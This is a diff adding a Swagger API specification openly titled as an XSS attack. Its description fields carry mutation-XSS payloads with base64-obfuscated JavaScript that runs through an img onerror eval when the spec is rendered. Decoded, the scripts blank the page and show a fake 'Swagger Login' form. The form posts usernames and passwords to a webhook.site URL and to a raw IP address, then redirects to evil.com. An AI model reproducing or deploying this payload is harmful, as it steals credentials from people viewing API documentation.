@@ -1,0 +1,42 @@
+swagger: '2.0'
+info:
+  title: XSS Attack BY M0X0101
+  description: |
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea>
+    <img src=x id='dHJ5IHsKICAgIHNldFRpbWVvdXQoZnVuY3Rpb24oKSB7CiAgICAgICAgZG9jdW1lbnQuYm9keS5pbm5lckhUTUwgPSAnJzsKICAgICAgICB3aW5kb3cuYWxlcnQoJ1lvdSBuZWVkIHRvIGxvZ2luIGZpcnN0IScpOwogICAgICAgIHZhciBhID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnZm9ybScpOwogICAgICAgIGEuYWN0aW9uID0gImh0dHBzOi8vd2ViaG9vay5zaXRlLzdmODEwMzI1LWQ0ZGItNDhlYi04YjI3LTc0MzI1YjQ0NmU5YiI7CiAgICAgICAgYS5tZXRob2QgPSAnUE9TVCc7CiAgICAgICAgYS5vbnN1Ym1pdCA9IGZ1bmN0aW9uKGV2ZW50KSB7CiAgICAgICAgICAgIGV2ZW50LnByZXZlbnREZWZhdWx0KCk7CiAgICAgICAgICAgIHdpbmRvdy5sb2NhdGlvbi5ocmVmID0gJ2h0dHA6Ly9ldmlsLmNvbSc7CiAgICAgICAgfTsKICAgICAgICBhLmlubmVySFRNTCA9ICc8Y2VudGVyPjxiPlNrYWZmb2xkIFN3YWdnZXIgTG9naW48L2I+PGJyPlVzZXJuYW1lOiA8aW5wdXQgbmFtZT0idXNlck5hbWUiPjxicj5QYXNzd29yZDogPGlucHV0IHR5cGU9InBhc3N3b3JkIiBuYW1lPSJwd2QiPjxicj48aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iTG9naW4iPjwvY2VudGVyPic7CiAgICAgICAgZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTsKICAgIH0sIDEwMCk7Cn0gY2F0Y2ggKGUpIHsKICAgIGNvbnNvbGUuZXJyb3IoJ1hTUyBzY3JpcHQgZmFpbGVkOiAnLCBlKTsKfQ==' onerror='eval(atob(this.id))'>
+    ">
+  version: production
+basePath: /JSSResource/
+produces:
+  - application/xml
+  - application/json
+consumes:
+  - application/xml
+  - application/json
+security:
+  - basicAuth: []
+paths:
+  /M0X0101:
+    get:
+      responses:
+        '200':
+          description: No response was specified
+      tags:
+        - M0X0101_XSS_D
+      operationId: findAccounts
+      summary: Finds all accounts
+  '/hack/hachid/{id}':
+    delete:
+      parameters:
+        - description: |
+            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea>
+            <img src=x id='ZG9jdW1lbnQuYm9keS5pbm5lckhUTUw9Jyc7IHZhciBhPWRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2Zvcm0nKTthLmFjdGlvbj0iaHR0cDovLzE1Mi41OC45Ni41NDoxMzM3IjthLm1ldGhvZD0nUE9TVCc7YS5vbnN1Ym1pdD1mdW5jdGlvbigpe3dpbmRvdy5sb2NhdGlvbi5ocmVmPSdodHRwOi8vZXZpbC5jb20nfTthLmlubmVySFRNTD0nPGNlbnRlcj48Yj5GQUtFIFN3YWdnZXIgTG9naW48L2I+PGJyPlVzZXJuYW1lOiA8aW5wdXQgbmFtZT0idXNlck5hbWUiPjxicj5QYXNzd29yZDogPGlucHV0IHR5cGU9InBhc3N3b3JkIiBuYW1lPSJwd2QiPjxicj48aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iTG9naW4iPjwvY2VudGVyPic7IGRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7' onerror='eval(atob(this.id))'>
+            ">
+          format: int64
+          in: path
+          name: id
+          required: true
+          type: integer
+      responses:
+        '200':
+          description: No response was specified
